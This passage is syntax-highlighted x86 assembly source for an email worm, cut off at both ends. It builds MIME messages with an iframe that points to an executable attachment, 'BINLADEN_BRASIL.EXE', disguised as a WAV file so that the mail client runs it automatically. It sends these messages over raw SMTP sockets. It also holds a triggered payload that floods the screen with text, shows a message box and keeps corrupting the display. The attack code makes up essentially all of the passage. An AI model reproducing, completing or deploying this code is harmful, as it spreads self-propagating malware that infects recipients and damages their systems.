            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Transfer-Encoding: quoted-printable'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&lt;HTML&gt;'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'&lt;HEAD&gt;'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'&lt;/HEAD&gt;'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&lt;BODY bgColor=3D#ffffff&gt;'</span><span class="sc0"> </span><span class="sc1">;  &lt;BGSOUND ='</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&lt;iframe src=3D"cid:000801c154f7$4a1303e0$0100007f@khs3j5"&gt;&lt;/iframe&gt;'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&lt;DIV&gt;&lt;FONT face=3DArial size=3D2&gt; &lt;/FONT&gt;&lt;/DIV&gt;&lt;/BODY&gt;&lt;/HTML&gt;'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'------=_NextPart_000_0009_01C154DE.24E75DA0'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: audio/x-wav;'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'name="BINLADEN_BRASIL.EXE"'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Transfer-Encoding: base64'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-ID: &lt;000801c154f7$4a1303e0$0100007f@khs3j5&gt;'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">_boundary</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_boundary</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">boundarywww</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_x</span><span class="sc0">

            </span><span class="sc1">; sending file</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B64File</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B64File</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_x</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_boundary2</span><span class="sc0">

</span><span class="sc5">boundary2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'------=_NextPart_000_0009_01C154DE.24E75DA0--'</span><span class="sc0">
</span><span class="sc5">boundary2sz</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">boundary2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">_boundary2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">boundary2sz</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_x</span><span class="sc0">

            </span><span class="sc1">;  closing connection</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__quit</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_x</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recv_x</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">___quit</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_x</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recv_x</span><span class="sc0">

</span><span class="sc5">@@ret</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">EMAILSocket</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">EMAILSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">saved_esp</span><span class="sc0">
            </span><span class="sc6">popad</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__quit</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">___quit</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'QUIT'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">send_x</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pushad</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">send_x_test</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;cmp edi, 127</span><span class="sc0">
            </span><span class="sc1">;jb send_x_1</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_x_512</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SOCKET_ERROR</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">send_x_math</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_x_512</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SOCKET_ERROR</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">send_x_erro</span><span class="sc0">

</span><span class="sc5">send_x_math</span><span class="sc4">:</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">send_x_end</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">send_x_test</span><span class="sc0">

</span><span class="sc5">send_x_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">thesend</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SOCKET_ERROR</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">send_x_math</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">thesend</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SOCKET_ERROR</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">send_x_math</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">send_x_erro</span><span class="sc0">

</span><span class="sc5">thesend</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">;  size</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">;  ofs</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EMAILSocket</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">recv_x</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pushad</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">recvBuff</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">127</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EMAILSocket</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">recv</span><span class="sc0">

            </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">recvBuff</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">OutputDebugStringA</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
            </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">send_x_end</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">send_x_erro</span><span class="sc4">:</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">send_x_end</span><span class="sc0">

</span><span class="sc5">send_x_512</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
            </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">push_1024</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">push_512</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">127</span><span class="sc0">
            </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">push_127</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_127</span><span class="sc0">

</span><span class="sc5">push_1024</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_127</span><span class="sc0">

</span><span class="sc5">push_512</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_127</span><span class="sc0">

</span><span class="sc5">push_127</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">127</span><span class="sc0">
</span><span class="sc5">over_127</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">;  ofs</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EMAILSocket</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EndIcqSMail</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">EMAILSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">WSACleanup</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad943</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OUT ICQSENDMAIL'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ICQSendMail</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">ThePayload</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad328</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'STARTING MODULO PAYLOAD'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111111111b</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">864</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">PayRet</span><span class="sc0">

</span><span class="sc5">ShowMsg</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetDC</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc0">

</span><span class="sc5">TxtToScreen</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">SetBkMode</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">SetBkColor</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">SetTextColor</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111111111b</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111111111b</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">StringSize</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MainString</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">TextOutA</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">TxtToScreen</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BushText1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BushText2</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

</span><span class="sc5">screen_mix</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111111111b</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111111111b</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">dtsinv</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NOTSRCCOPY</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Fix</span><span class="sc0">

</span><span class="sc5">dtsinv</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">DSTINVERT</span><span class="sc0">
</span><span class="sc5">Fix</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111111111b</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111111111b</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111111111b</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111111111b</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">BitBlt</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">250</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">screen_mix</span><span class="sc0">
</span><span class="sc5">PayRet</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad325</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OUT MODULO PAYLOAD'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rnd_eax</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
